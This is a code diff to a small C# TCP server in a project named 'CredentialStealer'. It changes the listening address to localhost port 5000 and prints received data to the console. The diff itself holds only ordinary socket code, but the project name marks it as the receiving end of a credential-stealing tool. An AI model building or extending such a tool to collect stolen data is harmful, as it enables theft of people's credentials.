@@ -10,10 +10,12 @@ namespace CredentialStealer.Client.Console
 {
     class Server
     {
-        private const int PORT = 80;
+        private const int PORT = 5000;
+        private const string IP = "127.0.0.1";
         private const string EOF = "<EOF>";
         private TcpListener tcpListener;
         private Thread listenThread;
+
         private void ListenForClients()
         {
             this.tcpListener.Start();
@@ -70,12 +72,18 @@ namespace CredentialStealer.Client.Console
             TcpClient tcpClient = (TcpClient)client;
             NetworkStream clientStream = tcpClient.GetStream();
             ASCIIEncoding encoder = new ASCIIEncoding();
-            write(clientStream, encoder, read(clientStream, encoder));
+            byte[] buffer = new byte[tcpClient.ReceiveBufferSize];
+            buffer = read(clientStream, encoder);
+
+            string dataReceived = Encoding.ASCII.GetString(buffer, 0, buffer.Length);
+            System.Console.WriteLine("Received : " + dataReceived);
+
             tcpClient.Close();
         }
         public Server()
         {
-            this.tcpListener = new TcpListener(IPAddress.Any, PORT);
+            this.tcpListener = new TcpListener(IPAddress.Parse(IP), PORT);
+            System.Console.WriteLine(String.Format("The server is listening at port {0} on IP {1}...",PORT,IP));
             this.listenThread = new Thread(new ThreadStart(ListenForClients));
             this.listenThread.Start();
         }
